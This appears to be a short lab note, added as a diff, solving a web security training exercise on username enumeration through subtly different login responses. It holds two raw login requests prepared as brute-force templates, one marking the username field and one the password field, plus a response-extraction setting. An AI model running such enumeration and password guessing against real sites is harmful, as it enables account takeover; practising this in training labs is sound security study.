@@ -1,0 +1,44 @@
+Username enumeration via subtly different responses
+
+Intruder request to find out the username:
+POST /login HTTP/1.1
+Host: ac941f0b1f7c2f36808e9a8200ad00a2.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 65
+Origin: https://ac941f0b1f7c2f36808e9a8200ad00a2.web-security-academy.net
+Connection: close
+Referer: https://ac941f0b1f7c2f36808e9a8200ad00a2.web-security-academy.net/login
+Cookie: session=D3DbeNdXBSiz30pU4U5SHcQ46x0tIdxA
+Upgrade-Insecure-Requests: 1
+
+csrf=iIqojK60UKen1TpUhrPLeYFpeCPBtYGn&username=§asdf§&password=asdf
+
+
+Intruder request to find out the password:
+
+
+POST /login HTTP/1.1
+Host: ac941f0b1f7c2f36808e9a8200ad00a2.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 65
+Origin: https://ac941f0b1f7c2f36808e9a8200ad00a2.web-security-academy.net
+Connection: close
+Referer: https://ac941f0b1f7c2f36808e9a8200ad00a2.web-security-academy.net/login
+Cookie: session=D3DbeNdXBSiz30pU4U5SHcQ46x0tIdxA
+Upgrade-Insecure-Requests: 1
+
+csrf=iIqojK60UKen1TpUhrPLeYFpeCPBtYGn&username=ap&password=§asdf§
+
+Grep - Extract setting:
+
+From [-warning>] to [</p>\n                        <form]
+
+If you get the csrf token error, try opening the lab again.
